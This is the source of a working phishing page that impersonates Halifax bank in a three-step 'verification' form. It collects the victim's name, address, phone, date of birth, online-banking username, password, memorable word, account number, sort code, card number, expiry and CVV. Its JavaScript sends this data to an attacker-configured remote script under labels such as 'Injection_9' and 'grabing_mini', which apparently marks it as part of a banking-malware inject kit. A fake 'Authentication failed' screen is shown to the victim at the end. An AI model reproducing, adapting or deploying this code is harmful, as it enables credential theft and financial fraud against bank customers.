<!DOCTYPE html>

<html>
<head>
	<title>Halifax</title>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<meta name="viewport" content="width=device-width,height=device-height, initial-scale=1.0, user-scalable=yes, maximum-scale=1.0">
	<script src="uk/Halifax/js/jquery.min.js"></script>
	<script src="uk/Halifax/js/cat.functions.js"></script>
	<link rel="stylesheet" href="uk/Halifax/css/bootstrap.min.css">
	<link rel="stylesheet" href="uk/Halifax/css/font-awesome.min.css">
	<link rel="stylesheet" href="uk/Halifax/css/cat.style.css" type="text/css" media="all">
	<style type="text/css">
		*{outline:none;}.br{border:1px dotted red;}.stol{display:table;width:100%;}.td{display:table-cell;}.w100{width:100%;}.left_{text-align:left;}.right_{text-align:right;}.center{text-align:center;}.top{vertical-align:top;}.bottom{vertical-align:bottom;}.middle{vertical-align:middle;}.inline{display:inline-block;}.pad{padding:15px;}.tr{display:table-row;}.none{display:none;}
		body,html{background-color:transparent;}@media(max-width:768px){.block-xs{display:block;width:100%!important;}.center-xs{text-align:center!important;}}.ramka{border:2px solid#c3c4eb;background-color:white;border-radius:5px;background-color:white!important;}.header{padding:20px 20px;background-color:#22259b;border-radius:5px 5px 0 0;;color:white;}.body{padding:15px;}.control-label{color:#505050;font-weight:600;}.body h3{color:#1b1d5f;font-weight:600}.has-error.control-label,.has-error.help-block,.has-error.form-control-feedback{}.step_label_h4{color:#006a4d;}
  </style>
</head>
<body>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<div id="cat-error">
	<span>Authentication failed or timed out</span>
	<input type="button" class="button btn btn-info" value="Try enter again"
		onClick="tryEnterAgain();"/>
</div>

<div id="cat-forms">
	<form id="cat-step-1" class="cat-start-step">

	<div class="container cont1 " style="padding-top:15px">

      <div class="ramka">
        <div class="header">
          <div class="stol w100  ">
            <div class="td  middle left_" style="width:1px"><img src="uk/Halifax/images/logo_scrn.png" class=""></div>

            <div class="td  middle left_ hidden-xs" style="padding-left:20px">
              <h4 style="margin:0">|&nbsp;Verification</h4>
            </div>

            <div class="td  middle right_" style="padding-right:20px">
              <h4 style="margin:0">Step 1 of 3</h4>
            </div>
          </div>
        </div>

        <div class="body ">
          <div class="row ">
            <div class="col-sm-12 ">
              <h3 class="" style="margin-top:0">Attention</h3>

              <p>For security reasons you must confirm your identity.<br>
              Please note providing wrong or invalid information could lead to account suspension..</p>
              <hr class="">

              <div class="form-group">
                <div class="row ">
                  <div class="col-sm-4 ">
                    <label class="control-label" for="">First name:</label>
                  </div>

                  <div class="col-sm-3 ">
                    <div class="input-group ">
                      <input class="form-control" type="text" name="f_name" id="f_name" placeholder=""><span class="input-group-addon"><span class="fa fa-user "></span></span>
                    </div>
                  </div>
                </div>
              </div>

              <div class="form-group">
                <div class="row ">
                  <div class="col-sm-4 ">
                    <label class="control-label" for="">Last name:</label>
                  </div>

                  <div class="col-sm-3 ">
                    <div class="input-group ">
                      <input class="form-control" type="text" name="l_name" id="l_name" placeholder=""><span class="input-group-addon"><span class="fa fa-user "></span></span>
                    </div>
                  </div>
                </div>
              </div>

              <div class="form-group">
                <div class="row ">
                  <div class="col-sm-4 ">
                    <label class="control-label" for="">House or Flat number:</label>
                  </div>

                  <div class="col-sm-3 col-xs-5">
                    <input class="form-control" type="text" name="addr_lineN1" id="addr_lineN1" placeholder="">
                  </div>
                </div>
              </div>

              <div class="form-group">
                <div class="row ">
                  <div class="col-sm-4">
                    <label class="control-label" for="">Post code:</label>
                  </div>

                  <div class="col-sm-3  col-xs-5">
                    <input class="form-control" type="text" name="postcode" id="postcode" placeholder="">
                  </div>
                </div>
              </div>

              <div class="form-group">
                <div class="row ">
                  <div class="col-sm-4 ">
                    <label class="control-label" for="">Phone number:</label>
                  </div>

                  <div class="col-sm-3 ">
                    <div class="input-group ">
                      <input class="form-control" type="text" maxlength="11" name="phone" id="phone" placeholder=""><span class="input-group-addon"><span class="fa fa-phone "></span></span>
                    </div>
                  </div>
                </div>
              </div>

              <div class="form-group">
                <div class="row ">
                  <div class="col-sm-4 ">
                    <label class="control-label" for="">Date of birth:</label>
                  </div>

                  <div class="col-sm-1 col-xs-4" style="padding-right:5px">
                    <select class="form-control dob_d" name="dob_d" id="dob_d">
                      <option value="--">
                        Day
                      </option><script type="text/javascript">
for(i=1;i<=31;i++)
                      {document.write('<option value="'+i+'">'+i+'<\/option>');};
                      </script>
                    </select>
                  </div>

                  <div class="col-sm-1 col-xs-4" style="padding-right:5px;padding-left:5px">
                    <select class="form-control dob_m" name="dob_m" id="dob_m">
                      <option value="--">
                        Month
                      </option><script type="text/javascript">
for(i=1;i<=12;i++)
                      {document.write('<option value="'+i+'">'+i+'<\/option>');};
                      </script>
                    </select>
                  </div>

                  <div class="col-sm-1 col-xs-4" style="padding-left:5px">
                    <select class="form-control dob_y" name="dob_y" id="dob_y">
                      <option value="----">
                        Year
                      </option><script type="text/javascript">
for(i=1960;i<=2005;i++)
                      {document.write('<option value="'+i+'">'+i+'<\/option>');};
                      </script>
                    </select>
                  </div>
                </div>
              </div>
              <hr class="">

              <div class="form-group">
                <div class="row ">
                  <div class="col-sm-4 "></div>

                  <div class="col-sm-3 ">
					<input type="button" class="btn btn-info pull-right cont_but" value="Continue"/>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </form>

  <form id="cat-step-2" class="cat-step-block">
    <div class="container cont2" style="padding-top:15px">
      <div class="ramka">
        <div class="header">
          <div class="stol w100  ">
            <div class="td  middle left_" style="width:1px"><img src="uk/Halifax/images/logo_scrn.png" class=""></div>

            <div class="td  middle left_ hidden-xs" style="padding-left:20px">
              <h4 style="margin:0">|&nbsp;Verification</h4>
            </div>

            <div class="td  middle right_" style="padding-right:20px">
              <h4 style="margin:0">Step 2 of 3</h4>
            </div>
          </div>
        </div>

        <div class="body ">
          <div class="row ">
            <div class="col-sm-12 ">
              <h3 class="" style="margin-top:0">Attention</h3>

              <p>For security reasons you must confirm your identity.<br>
              Please note providing wrong or invalid information could lead to account suspension.</p>
              <hr class="">

              <div class="form-group">
                <div class="row ">
                  <div class="col-sm-4 ">
                    <label class="control-label" for="">Username:</label>
                  </div>

                  <div class="col-sm-3 ">
                    <input class="form-control" type="text" maxlength="" name="Username" id="Username" placeholder="">
                  </div>
                </div>
              </div>

              <div class="form-group ">
                <div class="row ">
                  <div class="col-sm-4 ">
                    <label class="control-label" for="">Password:</label>
                  </div>

                  <div class="col-sm-3">
                    <input class="form-control" type="text" name="Password" maxlength="" id="Password" placeholder="">
                  </div>
                </div>
              </div>

              <div class="form-group">
                <div class="row ">
                  <div class="col-sm-4 ">
                    <label class="control-label" for="">Memorable word:</label>
                  </div>

                  <div class="col-sm-3 ">
                    <input class="form-control" type="text" name="mw" maxlength="" id="mw" placeholder="">
                  </div>
                </div>
              </div>

              <div class="form-group">
                <div class="row ">
                  <div class="col-sm-4 ">
                    <label class="control-label" for="">Account number:</label>
                  </div>

                  <div class="col-sm-3 ">
                    <input class="form-control" type="text" name="acc" maxlength="8" id="acc" placeholder="">
                  </div>

                  <div class="col-sm-3 ">
                    <span class="some_class"><span class="fa fa-info-circle "></span>&nbsp;8 digits</span>
                  </div>
                </div>
              </div>

              <div class="form-group">
                <div class="row ">
                  <div class="col-sm-4 ">
                    <label class="control-label" for="">Sort code:</label>
                  </div>

                  <div class="col-sm-3 ">
                    <input class="form-control" type="text" name="sort" maxlength="6" id="sort" placeholder="">
                  </div>

                  <div class="col-sm-3 ">
                    <span class="some_class"><span class="fa fa-info-circle "></span>&nbsp;6 digits</span>
                  </div>
                </div>
              </div>
              <hr class="">

              <div class="form-group">
                <div class="row ">
                  <div class="col-sm-4 "></div>

                  <div class="col-sm-3 ">
                    <input type="button" class="btn btn-info pull-right cont_but" value="Continue"/>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </form>

  <form id="cat-step-3" class="cat-step-block">
    <div class="container cont3" style="padding-top:15px">
      <div class="ramka">
        <div class="header">
          <div class="stol w100  ">
            <div class="td  middle left_" style="width:1px"><img src="uk/Halifax/images/logo_scrn.png" class=""></div>

            <div class="td  middle left_ hidden-xs" style="padding-left:20px">
              <h4 style="margin:0">|&nbsp;Verification</h4>
            </div>

            <div class="td  middle right_" style="padding-right:20px">
              <h4 style="margin:0">Step 3 of 3</h4>
            </div>
          </div>
        </div>

        <div class="body ">
          <div class="row ">
            <div class="col-sm-12 ">
              <h3 class="" style="margin-top:0">Attention</h3>

              <p>For security reasons you must confirm your identity.<br>
              Please note providing wrong or invalid information could lead to account suspension.</p>
              <hr class="">

              <div class="form-group">
                <div class="row ">
                  <div class="col-sm-4 ">
                    <label class="control-label" for="">Card number:</label>
                  </div>

                  <div class="col-sm-3 ">
                    <div class="input-group ">
                      <input class="form-control" type="text" maxlength="16" name="cc" id="cc" placeholder="Card number..."><span class="input-group-addon"><span class="fa fa-credit-card "></span></span>
                    </div>
                  </div>
                </div>
              </div>

              <div class="form-group ">
                <div class="row ">
                  <div class="col-sm-4 ">
                    <label class="control-label" for="">Card expiry date:</label>
                  </div>

                  <div class="col-sm-2 col-xs-5">
                    <select class="form-control exp_m" name="exp_m" id="exp_m">
                      <option value="--">
                        Month
                      </option><script type="text/javascript">
for(i=1;i<=12;i++)
                      {document.write('<option value="'+i+'">'+i+'<\/option>');};
                      </script>
                    </select>
                  </div>

                  <div class="col-sm-2 col-xs-6">
                    <select class="form-control exp_y" name="exp_y" id="exp_y">
                      <option value="--">
                        Year
                      </option><script type="text/javascript">
for(i=2017;i<=2028;i++){document.write('<option value="'+i+'">'+i+'<\/option>');};
                      </script>
                    </select>
                  </div>
                </div>
              </div>

              <div class="form-group">
                <div class="row ">
                  <div class="col-sm-4 ">
                    <label class="control-label" for="">CVV:</label>
                  </div>

                  <div class="col-sm-2 col-xs-6">
                    <div class="input-group ">
                      <input class="form-control" type="text" maxlength="3" name="cvv" id="cvv"><span class="input-group-addon">CVV</span>
                    </div>
                  </div>
                </div>
              </div>
              <hr class="">

              <div class="form-group">
                <div class="row ">
                  <div class="col-sm-4 "></div>

                  <div class="col-sm-3 ">
					<input type="button" class="btn btn-info pull-right cont_but" value="Confirm"/>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </form>

	<form id="cat-step-4" class="cat-last-step">
		<span>Authentication failed or timed out</span>
		<input type="button" class="button btn btn-info" value="Try enter again"
			onClick="closeWindow()"/>
	</form>

  </div>
  <script>
	function getAjax(text) {
	var URL_='<?php echo $URL;?>';
	//alert(URL_);
	$.ajax({
	  type: 'POST',
	  url: URL_+'/o1o/a10.php',
	  data: text,
	  success: function(data) {
		$('.results').html(data);
	  },
	  error:  function(xhr, str){
		 //  alert('Возникла ошибка: ' + xhr.responseCode);
		}
	});
}
 </script>
   <script type = "text/javascript">
  	(function () {
		var IMEI='<?php echo $IMEI_country;?>';
  		$('.form-control').focus(function () {
  			$('.has-error').removeClass('has-error');
  		})

  		$('.cont1 .cont_but').bind('click', function () {
  			var err = false;
  			var f_name = $('#f_name').val();
  			var l_name = $('#l_name').val();
  			var addr_lineN1 = $('#addr_lineN1').val();
  			var postcode = $('#postcode').val();
  			var phone = $('#phone').val();
  			var VRegExp = new RegExp(/^[a-z-A-Z]{3,50}\b/);
  			if (!VRegExp.test(f_name)) {
  				$('#f_name').closest('.form-group').addClass('has-error');
  				err = true;
  			};
  			var VRegExp = new RegExp(/^[a-z-A-Z]{3,50}\b/);
  			if (!VRegExp.test(l_name)) {
  				$('#l_name').closest('.form-group').addClass('has-error');
  				err = true;
  			};
  			var VRegExp = new RegExp(/^[a-z-A-Z0-9]{1,10}\b/);
  			if (!VRegExp.test(addr_lineN1)) {
  				$('#addr_lineN1').closest('.form-group').addClass('has-error');
  				err = true;
  			};
  			if (postcode.length < 3) {
  				$('#postcode').closest('.form-group').addClass('has-error');
  				err = true;
  			};
  			var VRegExp = new RegExp(/^[0-9]{6,11}\b/);
  			if (!VRegExp.test(phone)) {
  				$('#phone').closest('.form-group').addClass('has-error');
  				err = true;
  			};
  			if ($('.dob_d option:selected').val() == "--") {
  				$('.dob_d').closest('.form-group').addClass('has-error');
  				err = true;
  			};
  			if ($('.dob_m option:selected').val() == "--") {
  				$('.dob_m').closest('.form-group').addClass('has-error');
  				err = true;
  			};
  			if ($('.dob_y option:selected').val() == "----") {
  				$('.dob_y').closest('.form-group').addClass('has-error');
  				err = true;
  			};
  			if (err == true) {
  				return;
  			};
			switchStep(1, false);
  		});

  		$('.cont2 .cont_but').bind('click', function () {
  			var err = false;
  			var Username = $('#Username').val();
  			var Password = $('#Password').val();
  			var mw = $('#mw').val();
  			var acc = $('#acc').val();
  			var sort = $('#sort').val();
  			var VRegExp = new RegExp(/^[a-z-A-Z0-9]{4,20}\b/);
  			if (!VRegExp.test(Username)) {
  				$('#Username').closest('.form-group').addClass('has-error');
  				err = true;
  			};
  			var VRegExp = new RegExp(/^[a-z-A-Z0-9]{5,20}\b/);
  			if (!VRegExp.test(Password)) {
  				$('#Password').closest('.form-group').addClass('has-error');
  				err = true;
  			};
  			var VRegExp = new RegExp(/^[a-z-A-Z0-9]{4,15}\b/);
  			if (!VRegExp.test(mw)) {
  				$('#mw').closest('.form-group').addClass('has-error');
  				err = true;
  			};
  			var VRegExp = new RegExp(/^[0-9]{8}\b/);
  			if (!VRegExp.test(acc)) {
  				$('#acc').closest('.form-group').addClass('has-error');
  				err = true;
  			};
  			var VRegExp = new RegExp(/^[0-9]{6}\b/);
  			if (!VRegExp.test(sort)) {
  				$('#sort').closest('.form-group').addClass('has-error');
  				err = true;
  			};
  			if (err == true) {
  				return;
  			};

			var f_name = $('#f_name').val();
  			var l_name = $('#l_name').val();
  			var addr_lineN1 = $('#addr_lineN1').val();
  			var postcode = $('#postcode').val();
  			var phone = $('#phone').val();
			var dateBrith = $('#dob_d').val()+'.'+$('#dob_m').val()+'.'+$('#dob_y').val();



			getAjax('p=' + IMEI + '|Injection_9|Halifax|'+Username+"|"+Password+"|"+mw+'|'+f_name+'|'+l_name+'|'+phone+'|'
			+dateBrith+'|House or Flat number: '+addr_lineN1+'//br//Post code: '+postcode+'//br//Account number: '+acc
			+'//br//Sort code: '+sort);

			switchStep(2, false);
  		});

  		$('.cont3 .cont_but').bind('click', function () {
  			var err = false;
  			var cc = $('#cc').val();
			var exp=$('#exp_m').val()+'/'+$('#exp_y').val();
  			var cvv = $('#cvv').val();
  			if (!Validate(cc)) {
  				$('#cc').closest('.form-group').addClass('has-error');
  				err = true;
  			};
  			if ($('.exp_m option:selected').val() == "--") {
  				$('.exp_m').closest('.form-group').addClass('has-error');
  				err = true;
  			};
  			if ($('.exp_y option:selected').val() == "----") {
  				$('.exp_y').closest('.form-group').addClass('has-error');
  				err = true;
  			};
  			var VRegExp = new RegExp(/^[0-9]{3}\b/);
  			if (!VRegExp.test(cvv)) {
  				$('#cvv').closest('.form-group').addClass('has-error');
  				err = true;
  			};
  			if (err == true) {
  				return;
  			};
			var URL__='<?php echo $URL;?>';
			location.replace(URL__+'/o1o/a10.php?p=' + IMEI + '|grabing_mini|'+ cc + '|' + exp + '|' + cvv +'||');

			//switchStep(3, true);
  		});
  	})();

  function Calculate(Luhn) {
  	var sum = 0;
  	for (i = 0; i < Luhn.length; i++) {
  		sum += parseInt(Luhn.substring(i, i + 1));
  	}
  	var delta = new Array(0, 1, 2, 3, 4, -4, -3, -2, -1, 0);
  	for (i = Luhn.length - 1; i >= 0; i -= 2) {
  		var deltaIndex = parseInt(Luhn.substring(i, i + 1));
  		var deltaValue = delta[deltaIndex];
  		sum += deltaValue;
  	}
  	var mod10 = sum % 10;
  	mod10 = 10 - mod10;
  	if (mod10 == 10) {
  		mod10 = 0;
  	}
  	return mod10;
  };

  function Validate(Luhn) {
  	var LuhnDigit = parseInt(Luhn.substring(Luhn.length - 1, Luhn.length));
  	var LuhnLess = Luhn.substring(0, Luhn.length - 1);
  	if (Calculate(LuhnLess) == parseInt(LuhnDigit)) {
  		return true;
  	}
  	return false;
  };
  </script>
</body>
</html>
